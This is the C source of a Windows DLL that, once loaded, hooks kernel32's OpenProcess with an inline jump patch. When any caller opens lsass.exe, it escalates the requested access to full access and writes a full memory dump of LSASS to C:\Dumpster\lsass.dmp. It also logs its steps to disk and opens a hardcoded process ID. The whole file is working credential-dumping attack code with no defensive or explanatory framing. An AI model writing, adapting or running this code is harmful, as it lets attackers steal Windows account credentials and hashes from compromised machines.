#include "main.h"

BOOL hooked = FALSE;
typedef HANDLE(*RealOpenProcess)(DWORD, BOOL, DWORD);
typedef BOOL(*MiniDumpWriteDump)(HANDLE, DWORD, HANDLE, DWORD, VOID*, VOID*, VOID*);
DWORD lsassPID = 0;
DWORD dumped = 0;
RealOpenProcess rop;
FARPROC kernel32OpenProcess;

void Log(CHAR **data) {
    CHAR path[256];
    DWORD dwBytes;
    snprintf(path, 255, "C:\\Dumpster\\%d.log", GetCurrentProcessId());
    HANDLE hFile = CreateFile(path, FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    WriteFile(hFile, *data, strlen(*data), &dwBytes, NULL);
    memset(*data, 0x00, 256);
    CloseHandle(hFile);
}

HANDLE HookedOpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId) {
    CHAR *log = (CHAR*)GlobalAlloc(GPTR, 256);
    HANDLE hProc;
    snprintf(log, 255, "HookedOpenProcess Called ARGS PID:%d Access 0x%x\n", dwProcessId, dwDesiredAccess);
    Log(&log);

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if(Process32First(hSnap, &pe32)) {
        do {
            if(!lsassPID) {
                if(strcmp(pe32.szExeFile, "lsass.exe") == 0) {
                    lsassPID = pe32.th32ProcessID;
                    snprintf(log, 255, "LSASS PID is %d\n", lsassPID);
                    Log(&log);
                }
            }
        } while(Process32Next(hSnap, &pe32));
    }

    CloseHandle(hSnap);

    if(dwProcessId == lsassPID) {
        dwDesiredAccess = PROCESS_ALL_ACCESS;
    }

    hProc = rop(dwDesiredAccess, bInheritHandle, dwProcessId);

    if(hProc) {
        if(dwProcessId == lsassPID) {
            if(!dumped) {
                dumped = TRUE;
                snprintf(log, 255, "GOT HANDLE on LSASS HANDLE is 0x%p\n", hProc);
                Log(&log);

                HANDLE hFile;
                MiniDumpWriteDump mdwd;

                mdwd = (MiniDumpWriteDump)GetProcAddress(LoadLibrary("Dbghelp.dll"), "MiniDumpWriteDump");

                snprintf(log, 255, "MiniDumpWriteDump at 0x%p\n", mdwd);
                Log(&log);

                hFile = CreateFile("C:\\Dumpster\\lsass.dmp", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

                mdwd(hProc, dwProcessId, hFile, 2, NULL, NULL, NULL);
                CloseHandle(hFile);
            }
        }
    }

    snprintf(log, 255, "HookedOpenProcess call OpenProcess HANDLE returned is 0x%p\n", hProc);
    Log(&log);

    GlobalFree(log);

    return hProc;
}

void DLL_EXPORT Hook()
{
    CHAR *log = (CHAR*)GlobalAlloc(GPTR, 256);
    snprintf(log, 255, "DLL loaded inside PID %d\n", GetCurrentProcessId());
    Log(&log);

    if(!hooked) {
        rop = (RealOpenProcess)GetProcAddress(LoadLibrary("kernelbase.dll"), "OpenProcess");
        kernel32OpenProcess = GetProcAddress(LoadLibrary("kernel32.dll"), "OpenProcess");

        snprintf(log, 255, "kernelbase.dll!OpenProcess at 0x%p\n", rop);
        Log(&log);
        snprintf(log, 255, "kernel32.dll!OpenProcess at 0x%p\n", kernel32OpenProcess);
        Log(&log);
        snprintf(log, 255, "current!HookedOpenProcess at 0x%p\n", HookedOpenProcess);
        Log(&log);

        DWORD dwSize = 7;
        DWORD dwOld = 0;
        CHAR *patch = (CHAR*)GlobalAlloc(GPTR, dwSize);
        CHAR *addr = (CHAR*)kernel32OpenProcess;
        long long longHookedOpenProcess = (long long)HookedOpenProcess;
        DWORD dwHooked = (DWORD)longHookedOpenProcess;

        VirtualProtect((VOID*)kernel32OpenProcess, dwSize, PAGE_EXECUTE_READWRITE, &dwOld);
        snprintf(log, 255, "kernel32.dll!OpenProcess at 0x%p old permission was 0x%x\n", kernel32OpenProcess, dwOld);
        Log(&log);

        DWORD i = 0;
        DWORD position = 1;

        patch[0] = 0xb8;
        for(i; i < 4; i++) {
            CHAR current = dwHooked;
            patch[position++] = current;
            dwHooked >>= 8;
        }
        patch[5] = 0xff;
        patch[6] = 0xe0;

        memcpy(addr, patch, dwSize);
        VirtualProtect((VOID*)kernel32OpenProcess, dwSize, PAGE_EXECUTE_READ, &dwOld);
    }

    OpenProcess(PROCESS_ALL_ACCESS, FALSE, 13900);

    GlobalFree(log);
    hooked = TRUE;
}

extern "C" DLL_EXPORT BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    switch (fdwReason)
    {
        case DLL_PROCESS_ATTACH:
            Hook();
            // attach to process
            // return FALSE to fail DLL load
            break;

        case DLL_PROCESS_DETACH:
            // detach from process
            break;

        case DLL_THREAD_ATTACH:
            // attach to thread
            break;

        case DLL_THREAD_DETACH:
            // detach from thread
            break;
    }
    return TRUE; // succesful
}

